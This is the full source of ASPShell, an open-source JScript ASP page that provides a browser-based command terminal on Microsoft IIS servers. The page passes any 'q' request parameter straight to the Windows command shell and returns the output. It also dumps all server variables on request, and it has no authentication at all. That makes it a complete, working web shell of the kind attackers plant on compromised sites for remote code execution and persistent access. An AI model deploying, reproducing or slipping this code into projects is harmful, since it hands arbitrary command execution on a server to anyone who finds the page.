<%@ Language = "JScript" %>
<%
/*
    ASPShell - web based shell for Microsoft IIS
    Copyright (C) 2007  Kurt Hanner

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

    http://aspshell.sourceforge.net
*/
  var version = "0.2 (beta) [2007-09-29]";
  var homepagelink = "http://aspshell.sourceforge.net";

  var q = Request("q")();
  var cd = Request("cd")();
  if (q)
  {
    var command = "";
    var output = "";
    if (q.length == 0)
    {
      q = ":";
    }
    command = "" + q;
    if (command == "?")
    {
      output = "    ?                    this help page\n" +
               "    :sv                  all server variables\n" +
               "    <shell command>      execute any shell command\n";
    }
    else if (command.toLowerCase() == ":sv")
    {
      var sv = "";
      var svvalue = "";
      var esv = new Enumerator(Request.ServerVariables);
      for (; !esv.atEnd(); esv.moveNext())
      {
        sv = esv.item();
        output += sv;
        output += ": ";
        svvalue = "" + Request.ServerVariables(sv);
        if (svvalue.indexOf("\n") >= 0)
        {
          output += "\n";
          var svitems = svvalue.split("\n");
          for (var i=0; i<svitems.length; i++)
          {
            if (svitems[i].length > 0)
            {
              output += "    ";
              output += svitems[i];
              output += "\n";
            }
          }
        }
        else
        {
          output += svvalue;
          output += "\n";
        }
      }
    }
    else if (command.toLowerCase() == ":cd")
    {
      var fso = new ActiveXObject("Scripting.FileSystemObject");
      output = fso.GetAbsolutePathName(".");
    }
    else if (/^:checkdir\s(.*)?$/i.test(command))
    {
      var newdirabs = "";
      var newdir = RegExp.$1;
      var fso = new ActiveXObject("Scripting.FileSystemObject");
      var cdnorm = fso.GetFolder(cd).Path;
      if (/^\\/i.test(newdir)) 
      {
        newdirabs = fso.GetFolder(cd).Drive + newdir;
      }
      else if (/^\w:/i.test(newdir))
      {
        newdirabs = fso.GetAbsolutePathName(newdir);
      }
      else
      {
        newdirabs = fso.GetAbsolutePathName(fso.GetFolder(cd).Path + "\\" + newdir);
      }
      output = fso.FolderExists(newdirabs) ? newdirabs : "fail";
    }
    else
    {
      var changedir = "";
      var currdrive = "";
      var currpath = "";
      var colonpos = cd.indexOf(":");
      if (colonpos >= 0) {
        currdrive = cd.substr(0, colonpos+1);
        currpath = cd.substr(colonpos+1);
        changedir = currdrive + " && cd \"" + currpath + "\" && ";
      }
      var shell = new ActiveXObject("WScript.Shell");
      var pipe = shell.Exec("%comspec% /c \"" + changedir + command + "\"");
      output = pipe.StdOut.ReadAll() + pipe.StdErr.ReadAll();
    }
    Response.Write(output);
  }
  else
  {
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    var currentpath = fso.GetAbsolutePathName(".");
    var currentdrive = fso.GetDrive(fso.GetDriveName(currentpath));
    var drivepath = currentdrive.Path;
%>
<html>

<head>
<meta HTTP-EQUIV="Content-Type" Content="text/html; charset=Windows-1252">
<style><!--
  body {
    background: #000000;
    color: #CCCCCC;
    font-family: courier new;
    font-size: 10pt
  }
  input {
    background: #000000;
    color: #CCCCCC;
    border: none;
    font-family: courier new;
    font-size: 10pt;
  }
--></style>

<script language="JavaScript"><!--

  var history = new Array();
  var historypos = 0;
  var currentdirectory = "";
  var checkdirectory = "";

  function ajax(url, vars, callbackFunction)
  {
    var request = window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject("MSXML2.XMLHTTP.3.0");
    request.open("POST", url, true);
    request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); 
    request.onreadystatechange = function()
    {
      if (request.readyState == 4 && request.status == 200)
      {
        if (request.responseText)
        {
          callbackFunction(request.responseText);
        }
      }
    }
    request.send(vars);
  }

  function FormatOutput(txt)
  {
    return txt.replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/\x20/g, "&nbsp;").replace(/\t/g, "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;").replace(/\n/g, "<br/>");
  }

  function KeyDownEventHandler(ev)
  {
    document.all("q").focus();
    if (!ev)
    {
      ev = window.event;
    }
    if (ev.which)
    {
      keycode = ev.which;
    }
    else if (ev.keyCode)
    {
      keycode = ev.keyCode;
    }
    if (keycode == 13)
    {
      var cmd = document.all("q").value;
      outputAvailable("[" + currentdirectory + "] " + cmd);
      if (/cd\s+(\"?)(.*)?\1\s*$/i.test(cmd))
      {
        checkdirectory = RegExp.$2;
        ajax(document.URL, "q=" + encodeURIComponent(":checkdir " + RegExp.$2) + "&cd=" + encodeURIComponent(currentdirectory), checkdirAvailable);
        history[history.length] = cmd;
        historypos = history.length;
      }
      else if (cmd.length > 0)
      {
        ajax(document.URL, "q=" + encodeURIComponent(cmd) + "&cd=" + encodeURIComponent(currentdirectory), outputAvailable);
        history[history.length] = cmd;
        historypos = history.length;
      }
    }
    else if (keycode == 38 && historypos > 0)
    {
      historypos--;
      document.all("q").value = history[historypos];
    }
    else if (keycode == 40 && historypos < history.length)
    {
      historypos++;
      if (historypos == history.length)
      {
        document.all("q").value = "";
      }
      else {
        document.all("q").value = history[historypos];
      }
    }
  }

  function outputAvailable(output)
  {
    var newelem = document.createElement("DIV");
    newelem.innerHTML = FormatOutput(output);
    document.all("output").appendChild(newelem);
    var oldYPos = 0, newYPos = 0;
    var scroll = true;
    do
    {
      if (document.all)
      {
        oldYPos = document.body.scrollTop;
      }
      else
      {
        oldYPos = window.pageYOffset;
      }
      window.scrollBy(0, 100);
      if (document.all)
      {
        newYPos = document.body.scrollTop;
      }
      else
      {
        newYPos = window.pageYOffset;
      }
    } while (oldYPos < newYPos);
    document.all("q").value = "";
  }

  function checkdirAvailable(output)
  {
    if (output.toLowerCase() == "fail")
    {
      outputAvailable("The system cannot find the path specified.");
    }
    else {
      SetCurrentDirectory(output);
    }
  }

  function SetCurrentDirectory(output)
  {
    currentdirectory = output;
    document.all("prompt").innerHTML = "[" + output + "]";
  }

  function GetCurrentDirectory()
  {
    ajax(document.URL, "q=" + encodeURIComponent(":cd"), SetCurrentDirectory);
  }

  function InitPage()
  {
    document.all("q").focus();
    document.onkeydown = KeyDownEventHandler;
    GetCurrentDirectory();
  }
//--></script>

<title id=titletext>Web Shell</title>
</head>

<body onload="InitPage()">

<div id="output">
  <div id="greeting">
    ASPShell - Web-based Shell Environment Version <%=version%><br/>
    Copyright (c) 2007 Kurt Hanner, <a href="<%=homepagelink%>"><%=homepagelink%></a><br/><br/>
  </div>
</div>

<label id="prompt">[undefined]</label>
<input type="text" name="q" maxlength=1024 size=72>

</body>
</html>
<%
  }
%>